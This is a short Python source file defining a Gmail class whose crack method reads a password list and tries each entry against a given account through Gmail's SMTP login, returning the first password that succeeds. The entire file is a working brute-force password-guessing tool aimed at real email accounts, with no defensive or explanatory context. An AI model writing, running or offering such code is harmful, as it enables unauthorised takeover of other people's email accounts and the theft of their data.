import smtplib



class Gmail:
    def __init__(self, acc, pl, **kwargs):
        self.acc = acc
        self.pl = pl

    def crack(self):
        pl = open(self.pl, 'r').read()
        for i in pl.split():
            try:
                server = smtplib.SMTP('smtp.gmail.com', 587)
                server.starttls()
                server.ehlo()
                server.login(self.acc, i)
                return i
            except:
                pass
        return None